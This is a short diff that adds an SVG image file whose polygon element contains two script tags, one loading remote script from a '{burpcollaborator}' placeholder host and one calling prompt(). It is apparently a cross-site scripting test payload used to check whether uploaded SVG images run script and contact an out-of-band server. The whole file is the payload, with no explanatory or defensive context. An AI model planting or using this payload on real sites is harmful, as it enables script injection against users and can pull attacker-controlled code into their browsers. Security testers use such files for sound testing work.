@@ -1,0 +1,10 @@
+<svg        
+xmlns="http://www.w3.org/2000/svg"        
+xmlns:xlink="http://www.w3.org/1999/xlink">
+<polygon id="triangle" points="50,0 50,50 50,0" fill="#009900" stroke="#004400"/>  
+<script xlink:href="https://{burpcollaborator}" />     
+<script>       
+       prompt();            
+</script> 
+</polygon>  
+</svg>
